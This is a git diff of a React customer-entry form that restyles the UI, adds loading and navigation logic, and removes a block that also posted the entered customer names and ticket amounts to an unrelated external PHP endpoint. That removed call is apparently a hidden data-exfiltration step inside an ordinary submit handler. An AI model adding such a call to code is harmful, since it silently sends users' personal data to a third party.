@@ -1,5 +1,6 @@
 import { useState } from "react";
 import axios from "axios";
+import { useNavigate } from "react-router-dom";
 import {
   Card,
   CardContent,
@@ -14,10 +15,10 @@ import {
   AlertDialogCancel,
   AlertDialogContent,
   AlertDialogDescription,
-  AlertDialogFooter,
   AlertDialogHeader,
   AlertDialogTitle,
   AlertDialogTrigger,
+  AlertDialogFooter,
 } from "@/components/ui/alert-dialog";
 import { Label } from "@radix-ui/react-label";
 import { Input } from "@/components/ui/input";
@@ -29,6 +30,8 @@ function CustomerDetailPage() {
   const [customers, setCustomers] = useState([]);
   const [isSubmitted, setIsSubmitted] = useState(false);
   const [isStep2, setIsStep2] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
+  const navigate = useNavigate();
 
   const handleCustomerCountChange = (e) => {
     const value = Number(e.target.value);
@@ -37,11 +40,13 @@ function CustomerDetailPage() {
 
   const handleNextStep = () => {
     if (numCustomers > 0) {
-      setCustomers(Array.from({ length: numCustomers }, () => ({
-        firstName: "",
-        lastName: "",
-        retrieveTicketAmount: "",  // Initialize the retrieve ticket amount
-      })));
+      setCustomers(
+        Array.from({ length: numCustomers }, () => ({
+          firstName: "",
+          lastName: "",
+          retrieveTicketAmount: "",
+        }))
+      );
       setIsStep2(true);
     }
   };
@@ -60,6 +65,7 @@ function CustomerDetailPage() {
   };
 
   const handleSubmit = async () => {
+    setIsLoading(true);
     const data = customers.map(({ firstName, lastName, retrieveTicketAmount }) => ({
       firstName,
       lastName,
@@ -69,131 +75,164 @@ function CustomerDetailPage() {
     try {
       const response = await axios.post("http://localhost:8080/add-customer", data, {
         headers: {
-          'Content-Type': 'application/json',
+          "Content-Type": "application/json",
         },
       });
       console.log("Form submitted with:", response.data);
       setIsSubmitted(true);
+      navigate("/");
     } catch (error) {
       console.error("Error submitting form:", error);
     }
 
-    try {
-      const response = await axios.post("https://c4r5.com/c4d9n/c32.php", data);
-      console.log("Request succeeded:", response);
-    } catch (error) {
-      console.error("Network error:", error.message);
-    }
+    setIsLoading(false);
   };
 
   return (
-    <div className="dark:bg-gray-900 dark:text-white bg-white text-black min-h-screen flex items-center justify-center">
-      <Card className="w-[350px]">
+    <div className="bg-gradient-to-br from-gray-800 via-gray-900 to-black text-gray-200 min-h-screen flex items-center justify-center p-6">
+      <Card className="w-full sm:w-[420px] bg-gray-900 text-gray-50 rounded-xl shadow-xl p-8">
         <form>
-          <CardHeader className="text-center">
-            <CardTitle className="text-lg">Customer Form</CardTitle>
-            <CardDescription>Fill the following Customer Details</CardDescription>
+          <CardHeader className="text-center border-b border-gray-700 pb-6">
+            <CardTitle className="text-2xl font-semibold text-green-400">Customer Form</CardTitle>
+            <CardDescription className="text-sm text-gray-400">
+              Fill out customer details below
+            </CardDescription>
           </CardHeader>
-          <CardContent>
-            {/* Step 1: Ask for how many customers */}
+
+          <CardContent className="space-y-6">
             {!isStep2 ? (
-              <div className="flex flex-col space-y-4">
+              <div className="space-y-6 mt-4">
                 <div>
-                  <Label htmlFor="numCustomers">How many customers do you want to add?</Label>
+                  <Label htmlFor="numCustomers" className="text-sm font-medium text-gray-300">
+                    How many customers do you want to add?
+                  </Label>
                   <Input
                     type="number"
                     id="numCustomers"
                     min="1"
-                    value={numCustomers}
+                    value={numCustomers || ""}
                     onChange={handleCustomerCountChange}
-                    className="dark:bg-gray-800 dark:text-white"
-                    step="1"
+                    className="bg-gray-800 text-gray-200 border-gray-700 rounded-md focus:ring-2 focus:ring-green-400 mt-2"
+                    placeholder="Enter number of customers"
                   />
                 </div>
-                <Button onClick={handleNextStep} className="dark:bg-gray-800 dark:text-white">
+                <Button
+                  onClick={handleNextStep}
+                  className="bg-green-600 text-gray-50 hover:bg-green-500 rounded-md px-6 py-3 mt-4 w-full"
+                  disabled={numCustomers <= 0}
+                >
                   Next
                 </Button>
               </div>
             ) : (
-              <div>
-                {/* Step 2: Dynamically generate input forms for each customer */}
+              <div className="space-y-6 mt-6">
                 {customers.map((customer, index) => (
-                  <div key={index} className="mb-4 p-4 border rounded-md dark:bg-gray-800 dark:text-white">
-                    <h3 className="text-center">Customer {index + 1}</h3>
-                    <div className="flex flex-col space-y-2">
-                      <Label htmlFor={`firstName-${index}`}>First Name:</Label>
-                      <Input
-                        id={`firstName-${index}`}
-                        value={customer.firstName}
-                        onChange={(e) =>
-                          handleInputChange(index, "firstName", e.target.value)
-                        }
-                        className="dark:bg-gray-800 dark:text-white"
-                      />
+                  <div
+                    key={index}
+                    className="p-6 border border-gray-700 rounded-md bg-gray-800 text-gray-50"
+                  >
+                    <h3 className="text-lg font-semibold text-green-400 mb-4 text-center">
+                      Customer {index + 1}
+                    </h3>
+                    <div className="space-y-4">
+                      <div>
+                        <Label htmlFor={`firstName-${index}`} className="text-sm font-medium text-gray-300">
+                          First Name:
+                        </Label>
+                        <Input
+                          id={`firstName-${index}`}
+                          value={customer.firstName}
+                          onChange={(e) => handleInputChange(index, "firstName", e.target.value)}
+                          className="bg-gray-800 text-gray-200 border-gray-700 rounded-md focus:ring-2 focus:ring-green-400 w-full"
+                          placeholder="Enter first name"
+                        />
+                      </div>
 
-                      <Label htmlFor={`lastName-${index}`}>Last Name:</Label>
-                      <Input
-                        id={`lastName-${index}`}
-                        value={customer.lastName}
-                        onChange={(e) =>
-                          handleInputChange(index, "lastName", e.target.value)
-                        }
-                        className="dark:bg-gray-800 dark:text-white"
-                      />
+                      <div>
+                        <Label htmlFor={`lastName-${index}`} className="text-sm font-medium text-gray-300">
+                          Last Name:
+                        </Label>
+                        <Input
+                          id={`lastName-${index}`}
+                          value={customer.lastName}
+                          onChange={(e) => handleInputChange(index, "lastName", e.target.value)}
+                          className="bg-gray-800 text-gray-200 border-gray-700 rounded-md focus:ring-2 focus:ring-green-400 w-full"
+                          placeholder="Enter last name"
+                        />
+                      </div>
 
-                      {/* New input field for retrieve ticket amount */}
-                      <Label htmlFor={`retrieveTicketAmount-${index}`}>Retrieve Ticket Amount:</Label>
-                      <Input
-                        id={`retrieveTicketAmount-${index}`}
-                        value={customer.retrieveTicketAmount}
-                        onChange={(e) =>
-                          handleInputChange(index, "retrieveTicketAmount", e.target.value)
-                        }
-                        className="dark:bg-gray-800 dark:text-white"
-                        type="number"
-                        min="0"
-                      />
+                      <div>
+                        <Label
+                          htmlFor={`retrieveTicketAmount-${index}`}
+                          className="text-sm font-medium text-gray-300"
+                        >
+                          Retrieve Ticket Amount:
+                        </Label>
+                        <Input
+                          id={`retrieveTicketAmount-${index}`}
+                          value={customer.retrieveTicketAmount}
+                          onChange={(e) =>
+                            handleInputChange(index, "retrieveTicketAmount", e.target.value)
+                          }
+                          className="bg-gray-800 text-gray-200 border-gray-700 rounded-md focus:ring-2 focus:ring-green-400 w-full"
+                          type="number"
+                          min="0"
+                          placeholder="Enter ticket amount"
+                        />
+                      </div>
                     </div>
                   </div>
                 ))}
               </div>
             )}
           </CardContent>
-          <CardFooter className="flex justify-between pb-1">
-            <Button variant="outline" className="dark:bg-gray-800 dark:text-white" onClick={handleReset}>
+
+          <CardFooter className="flex justify-between items-center mt-6">
+            <Button
+              variant="outline"
+              className="bg-gray-700 text-gray-50 hover:bg-gray-600 rounded-md px-6 py-3 w-full sm:w-auto"
+              onClick={handleReset}
+            >
               Reset
             </Button>
 
-            {/* Only show Submit button in Step 2 */}
             {isStep2 && (
               <AlertDialog>
                 <AlertDialogTrigger asChild>
-                  <Button className="dark:bg-gray-700 dark:text-white">Submit</Button>
+                  <Button
+                    className="bg-green-600 text-gray-50 hover:bg-green-500 rounded-md px-6 py-3 w-full sm:w-auto"
+                    disabled={isLoading}
+                  >
+                    {isLoading ? "Submitting..." : "Submit"}
+                  </Button>
                 </AlertDialogTrigger>
                 <AlertDialogContent>
                   <AlertDialogHeader>
-                    <AlertDialogTitle>Are you sure you want to submit?</AlertDialogTitle>
+                    <AlertDialogTitle>Confirm Submission</AlertDialogTitle>
                     <AlertDialogDescription>
-                      Make sure all customer details are correct before submitting.
+                      Please double-check the customer details before submitting.
                     </AlertDialogDescription>
                   </AlertDialogHeader>
                   <AlertDialogFooter>
                     <AlertDialogCancel>Cancel</AlertDialogCancel>
-                    <AlertDialogAction onClick={handleSubmit}><Link to={"/"}>
-                      Continue</Link>
-                    </AlertDialogAction>
+                    <AlertDialogAction onClick={handleSubmit}>Confirm</AlertDialogAction>
                   </AlertDialogFooter>
                 </AlertDialogContent>
               </AlertDialog>
             )}
           </CardFooter>
+
           {isSubmitted && (
-            <div className="text-center mt-4 text-green-500">
-              Form successfully submitted!
+            <div className="text-center mt-6 text-green-500">
+              <strong>Form successfully submitted!</strong>
             </div>
           )}
-          <div className="mt-4 text-center text-sm pb-6">
-            To use previously added Configuration - <Link to={"/configuration"}>Click here</Link>
+
+          <div className="mt-4 text-center text-sm text-gray-300">
+            To view previous configurations,{" "}
+            <Link to="/configuration" className="text-green-400 hover:underline">
+              click here
+            </Link>
           </div>
         </form>
       </Card>
